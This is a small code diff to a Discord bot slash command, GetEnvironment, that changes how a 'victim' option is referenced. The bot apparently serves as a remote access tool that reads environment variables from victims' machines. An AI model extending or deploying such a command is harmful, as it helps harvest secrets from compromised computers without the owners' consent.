@@ -13,7 +13,7 @@ class GetEnvironment(commands.Cog):
     @commands.slash_command(
         description="Finds the values of environment variables",
         options=[
-            self.bot.victim,
+            bot.victim,
             discord.Option("environment", description="The variable of which the value is wanted", required=True)
         ],
     )
